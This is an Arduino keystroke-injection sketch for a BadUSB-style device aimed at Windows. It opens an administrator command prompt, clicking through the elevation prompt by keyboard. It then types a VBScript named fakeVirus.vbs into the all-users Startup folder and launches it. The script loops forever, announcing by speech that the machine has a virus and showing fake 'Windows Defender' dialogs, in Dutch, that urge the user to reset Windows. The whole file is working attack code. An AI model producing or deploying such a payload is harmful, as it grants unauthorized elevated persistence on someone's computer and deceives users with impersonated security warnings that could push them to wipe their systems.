#include <Keyboard.h>

char windows = KEY_LEFT_GUI;
char ctrl = KEY_LEFT_CTRL;
char enter = KEY_RETURN;
char alt = KEY_LEFT_ALT;
char shift = KEY_LEFT_SHIFT;
char tab = KEY_TAB;

int delayTime = 350;

int timeBetweenActions = 60;

void cmd() {
  Keyboard.press(windows);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(delayTime);
  
  Keyboard.print("cmd");
  Keyboard.press(ctrl);
  Keyboard.press(shift);
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(delayTime);
  
  Keyboard.press(tab);
  Keyboard.releaseAll();
  Keyboard.press(tab);
  Keyboard.releaseAll();
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(delayTime);
}

void closeProgram() {
  Keyboard.press(alt);
  Keyboard.write(197); // f4
  Keyboard.releaseAll();
  delay(delayTime);
}

void setup() {
  delay(1000);
  Keyboard.begin();

  //delete old if exists
  cmd();
  Keyboard.println("del \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\fakeVirus.vbs\"");
  Keyboard.println("notepad");
  delay(delayTime);

  //write vbs file
  vbsContent();

  //save vbs file
  Keyboard.press(ctrl);
  Keyboard.press('s');
  Keyboard.releaseAll();

  Keyboard.println("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\fakeVirus.vbs");
  Keyboard.press(enter);
  Keyboard.releaseAll();

  //close notepad
  closeProgram();
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(delayTime);

  //start vbs
  Keyboard.println("\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\fakeVirus.vbs\"");
  Keyboard.press(enter);
  Keyboard.releaseAll();
  delay(delayTime);
  
  //close cmd
  closeProgram();
  
  Keyboard.end();
}

void loop() {
  
}

void vbsContent() {
  Keyboard.println("Dim max,min");
  Keyboard.println("max=1");
  Keyboard.println("min=0");
  Keyboard.println("Wscript.sleep 1000");
  Keyboard.println("While True");
  Keyboard.println("Dim random");
  Keyboard.println("Randomize");
  Keyboard.println("random=Int((max-min+1)*Rnd+min)");
  Keyboard.println("Select case random");
  Keyboard.println("case 0:");
  Keyboard.println("set sapi=CreateObject(\"sapi.spvoice\")");
  Keyboard.println("sapi.Speak \" U have a Virus! Please reset Windows to remove it!\"");
  Keyboard.println("sapi.Speak \" Again! U have a Virus! Please reset Windows to remove it!\"");
  Keyboard.println("case 1:");
  Keyboard.println("Dim i");
  Keyboard.println("While i < Int(10*Rnd+1)");
  Keyboard.println("x=msgbox(\" U heeft een Virus! Windows nu Resetten?\", 4+48+4096, \"Windows Defender\")");
  Keyboard.println("i=i+1");
  Keyboard.println("Wend");
  Keyboard.println("x=msgbox(\"Kan Windows niet resetten, probeer het op een later tijdstip opnieuw!\", 0+16+4096, \"Windows Defender\")");
  Keyboard.println("End Select");
  Keyboard.println("Wscript.sleep 1000*"+String(timeBetweenActions));
  Keyboard.println("Wend");
}
